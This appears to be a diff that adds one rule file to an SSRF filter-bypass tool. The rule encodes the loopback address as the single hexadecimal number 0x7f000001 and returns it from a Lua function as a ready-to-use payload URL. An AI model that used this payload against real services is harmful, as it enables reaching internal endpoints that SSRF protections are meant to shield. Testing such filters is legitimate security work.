@@ -1,0 +1,24 @@
+meta:
+  id: hex_single_number
+  version: 1
+  name: "Hexadecimal Single Number IP"
+  description: "Uses single hexadecimal number for IP (0x7f000001)"
+  author: "SSRFdevil"
+  created: "2026-06-19"
+  updated: "2026-06-19"
+  rank: 82
+  confidence: 90
+  severity: high
+  tags: [hex, ipv4, encoding, bypass]
+  references: []
+match:
+  schemes: [http, https]
+  requires: [hostname]
+  supports: [ipv4]
+script:
+  language: lua
+  entry: bypass
+  source: |
+    function bypass(ctx)
+      return { url = "http://0x7f000001/" }
+    end
